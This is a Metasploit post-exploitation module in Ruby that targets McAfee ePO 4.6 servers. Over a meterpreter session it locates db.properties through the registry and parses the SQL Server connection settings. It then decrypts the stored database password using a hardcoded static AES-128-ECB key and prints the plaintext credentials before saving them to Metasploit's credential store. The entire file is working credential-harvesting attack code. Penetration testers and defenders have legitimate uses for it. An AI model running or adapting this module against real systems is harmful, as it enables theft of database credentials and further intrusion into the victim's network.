##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/dns/resolver'
require 'msf/core/auxiliary/report'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather McAfee ePO 4.6 Config SQL Credentials',
      'Description'   => %q{
        This module extracts connection details and decrypts the saved password for the
        SQL database in use by a McAfee ePO 4.6 server. The passwords are stored in a
        config file. They are encrypted with AES-128-ECB and a static key.
      },
      'License'       => MSF_LICENSE,
      'Author'        => ['Nathan Einwechter <neinwechter[at]gmail.com>'],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))
  end

  def run
    # Find out where things are installed
    print_status('Finding Tomcat install path...')
    subkeys = registry_enumkeys('HKLM\Software\Network Associates\ePolicy Orchestrator',REGISTRY_VIEW_32_BIT)
    if subkeys.nil? or subkeys.empty?
      print_error ('ePO 4.6 Not Installed or No Permissions to RegKey')
      return
    end
    # Get the db.properties file location
    epol_reg_key = 'HKLM\Software\Network Associates\ePolicy Orchestrator'
    dbprops_file = registry_getvaldata(epol_reg_key, 'TomcatFolder',REGISTRY_VIEW_32_BIT)
    if dbprops_file == nil or dbprops_file == ''
      print_error('Could not find db.properties file location')
    else
      dbprops_file << '/conf/orion/db.properties';
      print_good('Found db.properties location');
      process_config(dbprops_file);
    end
  end

  def process_config(filename)
    config = client.fs.file.new(filename, 'r')
    print_status("Processing #{filename}")
    contents = config.read
    config_lines = contents.split("\n")
    for line in config_lines
      line.chomp
      line_array = line.split('=')
      case line_array[0]
      when 'db.database.name'
        database_name = ''
        line_array[1].each_byte { |x|  database_name << x unless x > 126 || x < 32 }
      when 'db.instance.name'
        database_instance = ''
        line_array[1].each_byte { |x|  database_instance << x unless x > 126 || x < 32 }
      when 'db.user.domain'
        user_domain = ''
        line_array[1].each_byte { |x|  user_domain << x unless x > 126 || x < 32 }
      when 'db.user.name'
        user_name = ''
        line_array[1].each_byte { |x|  user_name << x unless x > 126 || x < 32 }
      when 'db.port'
        port = ''
        line_array[1].each_byte { |x|  port << x unless x > 126 || x < 32 }
      when 'db.user.passwd.encrypted.ex'
        # ePO 4.6 encrypted password
        passwd = ''
        line_array[1].each_byte { |x|  passwd << x unless x > 126 || x < 32 }
        passwd.gsub('\\','')
        # Add any Base64 padding that may have been stripped out
        passwd << '=' until ( passwd.length % 4 == 0 )
        plaintext_passwd = decrypt46(passwd)
      when 'db.user.passwd.encrypted'
        # ePO 4.5 encrypted password - not currently supported, see notes below
        passwd = ''
        line_array[1].each_byte { |x|  passwd << x unless x > 126 || x < 32 }
        passwd.gsub('\\','')
        # Add any Base64 padding that may have been stripped out
        passwd << '=' until ( passwd.length % 4 == 0 )
        plaintext_passwd = 'PASSWORD NOT RECOVERED - ePO 4.5 DECRYPT SUPPORT IS WIP'
      when 'db.server.name'
        database_server_name = ''
        line_array[1].each_byte { |x|  database_server_name << x unless x > 126 || x < 32 }
      end
    end

    # resolve IP address for creds reporting

    result = client.net.resolve.resolve_host(database_server_name)
    if result[:ip].nil? or  result[:ip].empty?
      print_error('Could not determine IP of DB - credentials not added to report database')
      return
    end

    db_ip = result[:ip]

    print_good("SQL Server: #{database_server_name}")
    print_good("SQL Instance: #{database_instance}")
    print_good("Database Name: #{database_name}")
    if db_ip
      print_good("Database IP: #{db_ip}")
    end
    print_good("Port: #{port}")
    if user_domain == nil or user_domain == ''
      print_good('Authentication Type: SQL');
      full_user = user_name
    else
      print_good('Authentication Type: Domain');
      print_good("Domain: #{user_domain}");
      full_user = "#{user_domain}\\#{user_name}"
    end
    print_good("User: #{full_user}")
    print_good("Password: #{plaintext_passwd}")

    if (db_ip)
      # submit to reports
      service_data = {
        address: Rex::Socket.getaddress(db_ip),
        port: port,
        protocol: 'tcp',
        service_name: 'mssql',
        workspace_id: myworkspace_id
      }

      credential_data = {
        origin_type: :session,
        session_id: session_db_id,
        post_reference_name: self.refname,
        username: full_user,
        private_data: plaintext_passwd,
        private_type: :password
      }

      credential_core = create_credential(credential_data.merge(service_data))

      login_data = {
        core: credential_core,
        access_level: 'User',
        status: Metasploit::Model::Login::Status::UNTRIED
      }

      create_credential_login(login_data.merge(service_data))
      print_good('Added credentials to report database')
    else
      print_error('Could not determine IP of DB - credentials not added to report database')
    end
  end


  def decrypt46(encoded)
    encrypted_data = Rex::Text.decode_base64(encoded)
    aes = OpenSSL::Cipher.new('AES-128-ECB')
    aes.padding = 0
    aes.decrypt
    # Private key extracted from ePO 4.6.0 Build 1029
    # If other keys are required for other versions of 4.6 - will have to add version
    # identification routines in to the main part of the module
    key = [ 94, -100, 62, -33, -26, 37, -124, 54, 102, 33, -109, -128, 49, 90, 41, 51 ]
    aes.key = key.pack('C*')
    password = aes.update(encrypted_data) + aes.final
    # Get rid of all the crazy \f's that result
    password.gsub!(/[^[:print:]]/,'')
    return password
  end
end

